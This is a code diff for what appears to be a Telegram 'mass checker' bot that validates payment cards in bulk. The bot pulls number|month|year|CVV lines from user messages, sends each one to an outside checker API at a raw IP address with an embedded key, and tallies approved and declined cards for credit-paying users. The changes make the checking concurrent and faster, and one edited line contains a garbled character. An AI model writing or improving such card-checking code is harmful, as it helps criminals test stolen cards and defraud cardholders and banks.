@@ -1217,13 +1217,14 @@ import asyncio
 import time
 import aiohttp
 import re
+from typing import List, Dict, Any
 
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import ContextTypes
 
-from db import get_user, update_user  # your DB functions here
+from db import get_user, update_user  # Your DB functions here
 
 OWNER_ID = 8438505794  # Replace with your Telegram user ID
 user_cooldowns = {}
@@ -1232,6 +1233,7 @@ user_cooldowns = {}
 # Authorization & Cooldowns
 # -----------------------------
 async def check_authorization(update: Update) -> bool:
+    """Checks if the user is authorized to use the bot."""
     user_id = update.effective_user.id
     if user_id == OWNER_ID:
         return True
@@ -1243,6 +1245,7 @@ async def check_authorization(update: Update) -> bool:
     return True
 
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
+    """Enforces a cooldown period for the user."""
     cooldown = 5  # seconds
     now = time.time()
     last = user_cooldowns.get(user_id, 0)
@@ -1257,6 +1260,7 @@ async def enforce_cooldown(user_id: int, update: Update) -> bool:
     return True
 
 async def consume_credit(user_id: int) -> bool:
+    """Consumes one credit from the user's account."""
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
         new_credits = user_data["credits"] - 1
@@ -1264,110 +1268,144 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-
 # -----------------------------
 # Mass Checker Background Worker
 # -----------------------------
-async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
-    approved_count = declined_count = error_count = checked_count = 0
-    results = []
-    total_cards = len(cards_to_check)
+async def check_card_api(session: aiohttp.ClientSession, raw: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
+    """
+    Checks a single card against the API asynchronously.
+    Returns a dictionary with the card, status, and any error.
+    """
+    parts = raw.split("|")
+    if len(parts) != 4:
+        return {
+            "card": raw,
+            "status": "Invalid format",
+            "error": "Invalid card format: must be number|mm|yy|cvv",
+        }
+
+    # Normalize year to YY format
+    if len(parts[2]) == 4:
+        parts[2] = parts[2][-2:]
+    cc_normalized = "|".join(parts)
+
+    api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+
+    try:
+        async with sem:
+            async with session.get(api_url, timeout=25) as resp:
+                data = await resp.json()
+                status_raw = str(data.get("status", "Unknown"))
+                status_clean = re.sub(r"[^\w\s']", "", status_raw).strip().lower()
+                return {
+                    "card": cc_normalized,
+                    "status": status_raw,
+                    "status_clean": status_clean,
+                    "error": None,
+                }
+    except Exception as e:
+        return {
+            "card": cc_normalized,
+            "status": "API Error",
+            "error": str(e),
+        }
+
+async def check_cards_background(
+    cards_to_check: List[str], processing_msg, start_time: float
+):
+    """
+    Handles the asynchronous checking of multiple cards.
+    This function uses asyncio.gather for true concurrency.
+    """
     sem = asyncio.Semaphore(10)  # limit concurrent requests
+    total_cards = len(cards_to_check)
+    approved_count = 0
+    declined_count = 0
+    error_count = 0
+    checked_count = 0
+    results = []
 
     async with aiohttp.ClientSession() as session:
+        # Create a list of tasks for all card checks
+        tasks = [check_card_api(session, card, sem) for card in cards_to_check]
 
-        async def check_card(raw):
-            nonlocal approved_count, declined_count, error_count, checked_count
-
-            parts = raw.split("|")
-            if len(parts) != 4:
-                error_count += 1
-                checked_count += 1
-                return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
-
-            if len(parts[2]) == 4:  # convert yyyy to yy
-                parts[2] = parts[2][-2:]
-            cc_normalized = "|".join(parts)
-
-            api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
-
-            try:
-                async with sem:
-                    async with session.get(api_url, timeout=25) as resp:
-                        data = await resp.json()
-            except Exception as e:
-                error_count += 1
-                checked_count += 1
-                return (
-                    f"❌ API Error for `{escape_markdown(cc_normalized, version=2)}`: "
-                    f"`{escape_markdown(str(e), version=2)}`"
-                )
-
-            status_raw = str(data.get("status", "Unknown"))
-            status_clean = re.sub(r"[^\w\s']", "", status_raw).strip().lower()
-
-            if "approved" in status_clean:
-                approved_count += 1
-            elif "declined" in status_clean or "incorrect" in status_clean:
-                declined_count += 1
-            else:
-                error_count += 1
-
+        # Use asyncio.as_completed to process results as they come in
+        for completed_task in asyncio.as_completed(tasks):
+            result = await completed_task
             checked_count += 1
-            escaped_card = escape_markdown(cc_normalized, version=2)
-            escaped_status = escape_markdown(status_raw, version=2)
-            return f"`{escaped_card}`\n𝐒𝐭𝐚𝐭𝐮𝐬➳ {escaped_status}"
+            
+            # Process the result and update counters
+            if result.get("error"):
+                error_count += 1
+                result_text = (
+                    f"❌ API Error for `{escape_markdown(result['card'], version=2)}`: "
+                    f"`{escape_markdown(result['error'], version=2)}`"
+                )
+            else:
+                if "approved" in result.get("status_clean", ""):
+                    approved_count += 1
+                elif "declined" in result.get("status_clean", "") or "incorrect" in result.get("status_clean", ""):
+                    declined_count += 1
+                else:
+                    error_count += 1
+                
+                escaped_card = escape_markdown(result['card'], version=2)
+                escaped_status = escape_markdown(result['status'], version=2)
+                result_text = f"`{escaped_card}`\n𝐒𝐭𝐚𝐭𝐮𝐬➳ {escaped_status}"
+            
+            results.append(result_text)
 
-        # Process cards one by one
-        for card in cards_to_check:
-            result = await check_card(card)
-            results.append(result)
-
+            # Update the message after each card is checked, as requested
             current_time_taken = round(time.time() - start_time, 2)
-            current_summary = (
-                f"✘ 𝐓𝐨𝐭𝐚𝐥↣ {escape_markdown(str(total_cards), version=2)}\n"
-                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣ {escape_markdown(str(checked_count), version=2)}\n"
-                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣ {escape_markdown(str(approved_count), version=2)}\n"
-                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣ {escape_markdown(str(declined_count), version=2)}\n"
-                f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣ {escape_markdown(str(error_count), version=2)}\n"
-                f"✘ 𝐓𝐢𝐦𝐞↣ {escape_markdown(str(current_time_taken), version=2)} 𝐒\n"
-                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────\n"
-                + "\n──────── ⸙ ─────────\n".join(results)
-            )
-
+            summary_parts = [
+                f"✘ 𝐓𝐨𝐭𝐚𝐥↣ {escape_markdown(str(total_cards), version=2)}",
+                f"✘ 𝐂𝐡𝐞�𝐤𝐞𝐝↣ {escape_markdown(str(checked_count), version=2)}",
+                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣ {escape_markdown(str(approved_count), version=2)}",
+                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣ {escape_markdown(str(declined_count), version=2)}",
+                f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣ {escape_markdown(str(error_count), version=2)}",
+                f"✘ 𝐓𝐢𝐦𝐞↣ {escape_markdown(str(current_time_taken), version=2)} 𝐒\n",
+                f"𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸",
+                f"──────── ⸙ ─────────",
+            ]
+            
+            # Join the results for the message body
+            summary_body = "\n──────── ⸙ ─────────\n".join(results)
+            current_summary = "\n".join(summary_parts) + "\n" + summary_body
+            
             try:
                 await processing_msg.edit_text(
                     current_summary,
                     parse_mode=ParseMode.MARKDOWN_V2
                 )
             except Exception as e:
+                # Log the error but don't stop the process
                 print(f"⚠️ Failed to update message: {e}")
 
-            await asyncio.sleep(2)
-
-    # Final summary
+    # Final summary after all cards are checked
     final_time_taken = round(time.time() - start_time, 2)
-    final_summary = (
-        f"✘ 𝐓𝐨𝐭𝐚𝐥↣ {escape_markdown(str(total_cards), version=2)}\n"
-        f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣ {escape_markdown(str(checked_count), version=2)}\n"
-        f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣ {escape_markdown(str(approved_count), version=2)}\n"
-        f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣ {escape_markdown(str(declined_count), version=2)}\n"
-        f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣ {escape_markdown(str(error_count), version=2)}\n"
-        f"✘ 𝐓𝐢𝐦𝐞↣ {escape_markdown(str(final_time_taken), version=2)} 𝐒\n"
-        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────\n"
-        + "\n──────── ⸙ ─────────\n".join(results)
-        + "\n──────── ⸙ ─────────"
-    )
+    final_summary_parts = [
+        f"✘ 𝐓𝐨𝐭𝐚𝐥↣ {escape_markdown(str(total_cards), version=2)}",
+        f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣ {escape_markdown(str(checked_count), version=2)}",
+        f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣ {escape_markdown(str(approved_count), version=2)}",
+        f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣ {escape_markdown(str(declined_count), version=2)}",
+        f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣ {escape_markdown(str(error_count), version=2)}",
+        f"✘ 𝐓𝐢𝐦𝐞↣ {escape_markdown(str(final_time_taken), version=2)} 𝐒\n",
+        f"𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸",
+        f"──────── ⸙ ─────────",
+    ]
+    summary_body = "\n──────── ⸙ ─────────\n".join(results)
+    final_summary = "\n".join(final_summary_parts) + "\n" + summary_body
+    
     await processing_msg.edit_text(
         final_summary,
         parse_mode=ParseMode.MARKDOWN_V2
     )
 
-
 # -----------------------------
 # Command Handler
 # -----------------------------
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command handler for /mchk."""
     user = update.effective_user
     user_id = user.id
 
@@ -1401,6 +1439,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # ✅ Extract card lines
+    # The regex pattern is correct, no need to change
     card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
     card_lines = card_pattern.findall(raw_cards)
 
@@ -1424,7 +1463,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     try:
         await check_cards_background(
-            cards_to_check, user_id, user.first_name, processing_msg, start_time
+            cards_to_check, processing_msg, start_time
         )
     except Exception as e:
         safe_error = escape_markdown(str(e), version=2)
@@ -1432,7 +1471,6 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error during processing: `{safe_error}`",
             parse_mode=ParseMode.MARKDOWN_V2
         )
-
 
 
 
